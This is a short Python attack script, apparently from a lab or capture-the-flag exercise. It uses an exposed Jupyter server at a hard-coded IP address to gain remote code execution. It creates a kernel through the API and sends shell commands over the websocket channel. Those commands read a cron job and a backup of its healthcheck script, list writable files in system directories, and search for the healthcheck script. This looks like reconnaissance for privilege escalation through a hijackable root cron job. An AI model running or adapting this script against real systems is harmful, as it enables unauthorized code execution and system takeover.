#!/usr/bin/env python3
import json, time
import requests, websocket

base = "http://159.223.68.133:8888"
s = requests.Session()
s.get(base + "/tree", timeout=10)
xsrf = s.cookies.get("_xsrf")
r = s.post(base + "/api/kernels", headers={"X-XSRFToken": xsrf}, json={}, timeout=10)
r.raise_for_status()
kid = r.json()["id"]
cookie = "; ".join(f"{k}={v}" for k, v in s.cookies.items())
ws = websocket.create_connection(f"ws://159.223.68.133:8888/api/kernels/{kid}/channels", cookie=cookie, origin=base, timeout=10)
code = '''import subprocess
cmd = r"""sh -c '
echo ===CRON===
cat /etc/cron.d/argus-health 2>&1
echo ===BACKUP===
cat /tmp/healthcheck.sh.bak 2>&1
echo ===WRITABLE===
find /opt /usr/local /var -xdev -type f -writable -ls 2>/dev/null | head -100
echo ===MATCHES===
grep -Rni "healthcheck" /etc/cron* /opt /usr/local 2>/dev/null | head -100
'"""
r = subprocess.run(cmd, shell=True, text=True, capture_output=True)
print(r.stdout)
print(r.stderr)
'''
msg_id = "check"
ws.send(json.dumps({"header":{"msg_id":msg_id,"username":"argus","session":"argus","msg_type":"execute_request","version":"5.3"},"parent_header":{},"metadata":{},"channel":"shell","content":{"code":code,"silent":False,"store_history":False,"user_expressions":{},"allow_stdin":False,"stop_on_error":True}}))
end = time.time() + 15
while time.time() < end:
    msg = json.loads(ws.recv())
    if msg.get("parent_header", {}).get("msg_id") != msg_id:
        continue
    typ = msg.get("msg_type") or msg.get("header", {}).get("msg_type")
    if typ == "stream": print(msg["content"].get("text", ""), end="")
    if typ == "error": print("\n".join(msg["content"].get("traceback", [])))
    if typ == "status" and msg["content"].get("execution_state") == "idle": break
s.delete(base + f"/api/kernels/{kid}", headers={"X-XSRFToken":xsrf}, timeout=10)
